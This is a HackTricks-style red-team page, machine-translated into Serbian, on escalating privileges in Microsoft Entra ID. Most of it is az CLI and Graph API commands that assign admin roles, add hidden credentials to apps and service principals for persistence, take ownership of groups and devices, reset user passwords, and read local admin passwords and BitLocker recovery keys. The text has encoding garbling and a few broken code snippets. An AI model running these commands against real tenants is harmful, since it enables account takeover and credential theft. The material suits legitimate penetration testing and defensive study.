# Az - EntraID Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="info" %}
Napomena da **neke od granularnih dozvola** ugraÄ‘enih u uloge u Entra ID **nisu podobne za koriÅ¡Ä‡enje u prilagoÄ‘enim ulogama.**
{% endhint %}

## Roles

### Role: Privileged Role Administrator <a href="#c9d4cde0-7dcc-45d5-aa95-59d198ae84b2" id="c9d4cde0-7dcc-45d5-aa95-59d198ae84b2"></a>

Ova uloga sadrÅ¾i potrebne granularne dozvole za dodeljivanje uloga principima i za davanje viÅ¡e dozvola ulogama. Ove akcije se mogu zloupotrebiti za eskalaciju privilegija.

* Dodeli ulogu korisniku:
```bash
# List enabled built-in roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directoryRoles"

# Give role (Global Administrator?) to a user
roleId="<roleId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"
```
* Dodajte viÅ¡e dozvola ulozi:
```bash
# List only custom roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# Change the permissions of a custom role
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/<role-id>" \
--headers "Content-Type=application/json" \
--body '{
"description": "Update basic properties of application registrations",
"rolePermissions": [
{
"allowedResourceActions": [
"microsoft.directory/applications/credentials/update"
]
}
]
}'
```
## Aplikacije

### `microsoft.directory/applications/credentials/update`

Ovo omoguÄ‡ava napadaÄu da **dodaje akreditive** (lozinke ili sertifikate) postojeÄ‡im aplikacijama. Ako aplikacija ima privilegovane dozvole, napadaÄ moÅ¾e da se autentifikuje kao ta aplikacija i stekne te privilegije.
```bash
# Generate a new password without overwritting old ones
az ad app credential reset --id <appId> --append
# Generate a new certificate without overwritting old ones
az ad app credential reset --id <appId> --create-cert
```
### `microsoft.directory/applications.myOrganization/credentials/update`

Ovo omoguÄ‡ava iste akcije kao `applications/credentials/update`, ali je ograniÄeno na aplikacije unutar jedne direktorije.
```bash
az ad app credential reset --id <appId> --append
```
### `microsoft.directory/applications/owners/update`

**Description**: AÅ¾uriranje vlasnika aplikacija\
**Abuse Potential**: Dodavanjem sebe kao vlasnika, napadaÄ moÅ¾e manipulisati aplikacijom, ukljuÄujuÄ‡i kredencijale i dozvole.
```bash
az ad app owner add --id <AppId> --owner-object-id <UserId>
az ad app credential reset --id <appId> --append

# You can check the owners with
az ad app owner list --id <appId>
```
## Service Principals

### `microsoft.directory/servicePrincipals/credentials/update`

Ovo omoguÄ‡ava napadaÄu da doda akreditive postojeÄ‡im servisnim principalima. Ako servisni principal ima poviÅ¡ene privilegije, napadaÄ moÅ¾e preuzeti te privilegije.
```bash
az ad sp credential reset --id <sp-id> --append
```
{% hint style="danger" %}
Nova generisana lozinka se neÄ‡e pojaviti u web konzoli, tako da bi ovo mogla biti diskretna metoda za odrÅ¾avanje postojanosti nad servisnim principalom.\
Iz API-ja se mogu pronaÄ‡i sa: `az ad sp list --query '[?length(keyCredentials) > 0 || length(passwordCredentials) > 0].[displayName, appId, keyCredentials, passwordCredentials]' -o json`
{% endhint %}

Ako dobijete greÅ¡ku `"code":"CannotUpdateLockedServicePrincipalProperty","message":"Property passwordCredentials is invalid."` to je zato Å¡to **nije moguÄ‡e modifikovati svojstvo passwordCredentials** SP-a i prvo ga morate otkljuÄati. Za to vam je potrebna dozvola (`microsoft.directory/applications/allProperties/update`) koja vam omoguÄ‡ava da izvrÅ¡ite:

{% code overflow="wrap" %}
```bash
az rest --method PATCH --url https://graph.microsoft.com/v1.0/applications/<sp-object-id> --body '{"servicePrincipalLockConfiguration": null}'
```
{% endcode %}

### `microsoft.directory/servicePrincipals/synchronizationCredentials/manage`

Ovo omoguÄ‡ava napadaÄu da doda akreditive postojeÄ‡im servisnim principalima. Ako servisni principal ima poviÅ¡ene privilegije, napadaÄ moÅ¾e preuzeti te privilegije.
```bash
az ad sp credential reset --id <sp-id> --append
```
### `microsoft.directory/servicePrincipals/owners/update`

SliÄno aplikacijama, ova dozvola omoguÄ‡ava dodavanje viÅ¡e vlasnika servisa. VlasniÅ¡tvo nad servisom omoguÄ‡ava kontrolu nad njegovim akreditivima i dozvolama.
```bash
# Add new owner
spId="<spId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"

az ad sp credential reset --id <sp-id> --append

# You can check the owners with
az ad sp owner list --id <spId>
```
{% hint style="danger" %}
Nakon dodavanja novog vlasnika, pokuÅ¡ao sam da ga uklonim, ali je API odgovorio da DELETE metoda nije podrÅ¾ana, Äak i ako je to metoda koju treba koristiti za brisanje vlasnika. Dakle, **ne moÅ¾ete ukloniti vlasnike u danaÅ¡nje vreme**.
{% endhint %}

### `microsoft.directory/servicePrincipals/disable` and `enable`

Ove dozvole omoguÄ‡avaju onemoguÄ‡avanje i omoguÄ‡avanje servisnih principala. NapadaÄ bi mogao iskoristiti ovu dozvolu da omoguÄ‡i servisnog principala do kojem bi nekako mogao da doÄ‘e kako bi eskalirao privilegije.

Napomena: za ovu tehniku, napadaÄ Ä‡e trebati viÅ¡e dozvola kako bi preuzeo omoguÄ‡eni servisni principala.
```bash
bashCopy code# Disable
az ad sp update --id <ServicePrincipalId> --account-enabled false

# Enable
az ad sp update --id <ServicePrincipalId> --account-enabled true
```
#### `microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials` & `microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials`

Ove dozvole omoguÄ‡avaju kreiranje i dobijanje kredencijala za jedinstveno prijavljivanje, Å¡to moÅ¾e omoguÄ‡iti pristup aplikacijama treÄ‡ih strana.

{% code overflow="wrap" %}
```bash
# Generate SSO creds for a user or a group
spID="<spId>"
user_or_group_id="<id>"
username="<username>"
password="<password>"
az rest --method POST \
--uri "https://graph.microsoft.com/beta/servicePrincipals/$spID/createPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$user_or_group_id\", \"credentials\": [{\"fieldId\": \"param_username\", \"value\": \"$username\", \"type\": \"username\"}, {\"fieldId\": \"param_password\", \"value\": \"$password\", \"type\": \"password\"}]}"


# Get credentials of a specific credID
credID="<credID>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$credID/getPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$credID\"}"
```
{% endcode %}

***

## Grupe

### `microsoft.directory/groups/allProperties/update`

Ova dozvola omoguÄ‡ava dodavanje korisnika u privilegovane grupe, Å¡to dovodi do eskalacije privilegija.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
**Napomena**: Ova dozvola iskljuÄuje Entra ID grupe koje se mogu dodeliti uloge.

### `microsoft.directory/groups/owners/update`

Ova dozvola omoguÄ‡ava postajanje vlasnikom grupa. Vlasnik grupe moÅ¾e kontrolisati Älanstvo u grupi i podeÅ¡avanja, potencijalno eskalirajuÄ‡i privilegije u grupi.
```bash
az ad group owner add --group <GroupName> --owner-object-id <UserId>
az ad group member add --group <GroupName> --member-id <UserId>
```
**Napomena**: Ova dozvola iskljuÄuje Entra ID grupe koje se mogu dodeliti uloge.

### `microsoft.directory/groups/members/update`

Ova dozvola omoguÄ‡ava dodavanje Älanova u grupu. NapadaÄ moÅ¾e dodati sebe ili zlonamerne naloge u privilegovane grupe, Å¡to moÅ¾e omoguÄ‡iti poviÅ¡en pristup.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
### `microsoft.directory/groups/dynamicMembershipRule/update`

Ova dozvola omoguÄ‡ava aÅ¾uriranje pravila Älanstva u dinamiÄkoj grupi. NapadaÄ bi mogao da izmeni dinamiÄka pravila kako bi se ukljuÄio u privilegovane grupe bez eksplicitnog dodavanja.
```bash
groupId="<group-id>"
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/groups/$groupId" \
--headers "Content-Type=application/json" \
--body '{
"membershipRule": "(user.otherMails -any (_ -contains \"security\")) -and (user.userType -eq \"guest\")",
"membershipRuleProcessingState": "On"
}'
```
**Napomena**: Ova dozvola iskljuÄuje Entra ID grupe koje se mogu dodeliti uloge.

### DinamiÄke Grupe Privesc

MoÅ¾da je moguÄ‡e da korisnici eskaliraju privilegije modifikovanjem svojih svojstava kako bi bili dodati kao Älanovi dinamiÄkih grupa. Za viÅ¡e informacija pogledajte:

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

## Korisnici

### `microsoft.directory/users/password/update`

Ova dozvola omoguÄ‡ava resetovanje lozinke za korisnike koji nisu administratori, omoguÄ‡avajuÄ‡i potencijalnom napadaÄu da eskalira privilegije na druge korisnike. Ova dozvola ne moÅ¾e biti dodeljena prilagoÄ‘enim ulogama.
```bash
az ad user update --id <user-id> --password "kweoifuh.234"
```
### `microsoft.directory/users/basic/update`

Ova privilegija omoguÄ‡ava modifikaciju svojstava korisnika. UobiÄajeno je pronaÄ‡i dinamiÄke grupe koje dodaju korisnike na osnovu vrednosti svojstava, stoga, ova dozvola moÅ¾e omoguÄ‡iti korisniku da postavi potrebnu vrednost svojstva kako bi postao Älan odreÄ‘ene dinamiÄke grupe i eskalirao privilegije.

{% code overflow="wrap" %}
```bash
#e.g. change manager of a user
victimUser="<userID>"
managerUser="<userID>"
az rest --method PUT \
--uri "https://graph.microsoft.com/v1.0/users/$managerUser/manager/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/users/$managerUser"}'

#e.g. change department of a user
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/users/$victimUser" \
--headers "Content-Type=application/json" \
--body "{\"department\": \"security\"}"
```
{% endcode %}

## Politike uslovnog pristupa i zaobilaÅ¾enje MFA

PogreÅ¡no konfigurisane politike uslovnog pristupa koje zahtevaju MFA mogu se zaobiÄ‡i, proverite:

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

## UreÄ‘aji

### `microsoft.directory/devices/registeredOwners/update`

Ova dozvola omoguÄ‡ava napadaÄima da se dodele kao vlasnici ureÄ‘aja kako bi stekli kontrolu ili pristup podeÅ¡avanjima i podacima specifiÄnim za ureÄ‘aj.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/devices/registeredUsers/update`

Ova dozvola omoguÄ‡ava napadaÄima da poveÅ¾u svoj nalog sa ureÄ‘ajima kako bi dobili pristup ili zaobiÅ¡li bezbednosne politike.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/registeredUsers/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/deviceLocalCredentials/password/read`

Ova dozvola omoguÄ‡ava napadaÄima da proÄitaju svojstva rezervisanih lokalnih administratorskih naloga za ureÄ‘aje povezane sa Microsoft Entra, ukljuÄujuÄ‡i lozinku

{% code overflow="wrap" %}
```bash
# List deviceLocalCredentials
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials"

# Get credentials
deviceLC="<deviceLCID>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials/$deviceLCID?\$select=credentials" \
```
{% endcode %}

## BitlockerKeys

### `microsoft.directory/bitlockerKeys/key/read`

Ova dozvola omoguÄ‡ava pristup BitLocker kljuÄevima, Å¡to moÅ¾e omoguÄ‡iti napadaÄu da dekriptuje diskove, ugroÅ¾avajuÄ‡i poverljivost podataka.

{% code overflow="wrap" %}
```bash
# List recovery keys
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys"

# Get key
recoveryKeyId="<recoveryKeyId>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys/$recoveryKeyId?\$select=key"
```
{% endcode %}

## Ostale zanimljive dozvole (TODO)

* `microsoft.directory/applications/permissions/update`
* `microsoft.directory/servicePrincipals/permissions/update`
* `microsoft.directory/applications.myOrganization/allProperties/update`
* `microsoft.directory/applications/allProperties/update`
* `microsoft.directory/servicePrincipals/appRoleAssignedTo/update`
* `microsoft.directory/applications/appRoles/update`
* `microsoft.directory/applications.myOrganization/permissions/update`

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
